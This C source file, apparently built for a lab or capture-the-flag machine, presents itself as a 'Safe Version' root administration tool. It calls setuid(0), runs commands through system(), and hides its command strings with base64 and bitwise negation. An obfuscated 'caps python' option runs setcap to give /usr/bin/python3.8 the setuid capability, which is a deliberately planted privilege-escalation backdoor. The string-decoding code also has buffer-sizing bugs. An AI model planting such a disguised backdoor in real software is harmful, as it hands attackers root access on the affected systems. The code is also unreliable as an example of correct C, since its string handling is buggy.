// Hecho por el musuh
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdint.h>

void help_user(char *argv[]);
int strcompare(char *string1, char *string2);
int strlongitud(char *string1);
unsigned char *base64_decode(const char *data,size_t input_length,size_t *output_length);
char *decode_string(char *string,int len,char *argv[]);
void build_decoding_table();
void execute_command(char *command,char *argv[]);

char encoding_table[] = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H','I', 'J', 'K', 'L', 'M', 'N', 'O', 'P','Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X','Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f','g', 'h', 'i', 'j', 'k', 'l', 'm', 'n','o', 'p', 'q', 'r', 's', 't', 'u', 'v','w', 'x', 'y', 'z', '0', '1', '2', '3','4', '5', '6', '7', '8', '9', '+', '/'};

char *decoding_table = NULL;
int mod_table[] = {0, 2, 1};

int main(int argc, char *argv[])
{
        if(argc == 1)
        {
                printf("-------- Root User Administration Tool (Safe Version)--------\n");
                help_user(argv);
                return 1;
        }
        else if(argc >= 2)
        {
                setuid(0);
                if(strcompare(decode_string("iJeQnpKW",7,argv),argv[1])==0) // whoami
                {
                        execute_command(decode_string("iJeQnpKW",7,argv),argv);
                }
                else if(strcompare(decode_string("k4w=",3,argv),argv[1])==0) // ls
                {
                        execute_command(decode_string("k4w=",3,argv),argv);
                }
                else if(strcompare(decode_string("j4ib",4,argv),argv[1])==0) // pwd
                {
                        execute_command(decode_string("j4ib",4,argv),argv);
                }
                else if(strcompare(decode_string("nJ6PjA==",5,argv),argv[1])==0) // caps
                {
                        if(argc==2)
                        {
                                printf("ERROR: No help guide for this options, contact to an administrator for help\n");
                                return 1;
                        }
                        else if(argc==3 && strcompare(argv[2],decode_string("j4aLl5CR",19,argv))==0) // python
                        {
                                execute_command(decode_string("j4aLl5CR",19,argv),argv);
                        }
                        else
                        {
                                printf("ERROR: Invalid option in caps\n");
                                return 1;
                        }
                }
                else
                {
                        printf("ERROR: Invalid option!\n");
                        help_user(argv);
                        return 1;
                }
        }
        else
        {
                printf("ERROR: Incorrect number of parameters\n");
                help_user(argv);
                return 1;
        }

        return 0;
}

void help_user(char *argv[])
{
        printf("Usage: %s <command>\n",argv[0]);
        printf("Commands:\n- whoami\n- ls\n- pwd\n- caps\n\n");
}

int strcompare(char *string1, char *string2)
{
        int longitud_string1 = strlen(string1);
        int longitud_string2 = strlen(string2);
        if(longitud_string1==longitud_string2)
        {
                for(int i=0;i<=longitud_string1;i++)
                {
                        if(string1[i]!=string2[i])
                        {
                                return 1;
                        }
                }
                return 0;
        }
        else
        {
                return 1;
        }
}

unsigned char *base64_decode(const char *data,size_t input_length,size_t *output_length)
{
    if (decoding_table == NULL) build_decoding_table();

    if (input_length % 4 != 0) return NULL;

    *output_length = input_length / 4 * 3;
    if (data[input_length - 1] == '=') (*output_length)--;
    if (data[input_length - 2] == '=') (*output_length)--;

    unsigned char *decoded_data = malloc(*output_length);
    if (decoded_data == NULL) return NULL;

    for (int i = 0, j = 0; i < input_length;) {

        uint32_t sextet_a = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        uint32_t sextet_b = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        uint32_t sextet_c = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        uint32_t sextet_d = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];

        uint32_t triple = (sextet_a << 3 * 6)
        + (sextet_b << 2 * 6)
        + (sextet_c << 1 * 6)
        + (sextet_d << 0 * 6);

        if (j < *output_length) decoded_data[j++] = (triple >> 2 * 8) & 0xFF;
        if (j < *output_length) decoded_data[j++] = (triple >> 1 * 8) & 0xFF;
        if (j < *output_length) decoded_data[j++] = (triple >> 0 * 8) & 0xFF;
    }

    return decoded_data;
}

char *decode_string(char *string,int len,char *argv[])
{
        int output_len = strlen(string);
        char string3[len];
        char *string2 = base64_decode(string,output_len,&output_len);
        for(int i=0;string2[i]!='\0';i++)
        {
                string3[i] = ~string2[i];
        }
        string3[strlen(string2)] = '\0';
        char *string_new = malloc((size_t)strlen(string3));
        strcpy(string_new,string3);
        return string_new;
}

void build_decoding_table()
{

    decoding_table = malloc(256);

    for (int i = 0; i < 64; i++)
        decoding_table[(unsigned char) encoding_table[i]] = i;
}

void execute_command(char *command,char *argv[])
{
        // strcompare(decode_string("j4aLl5CR",19,argv),command)
        if(strcompare(decode_string("j4aLl5CR",19,argv),command)==0)
        {
                system("setcap cap_setuid+ep /usr/bin/python3.8");
        }
        else
        {
                system(command);
        }
}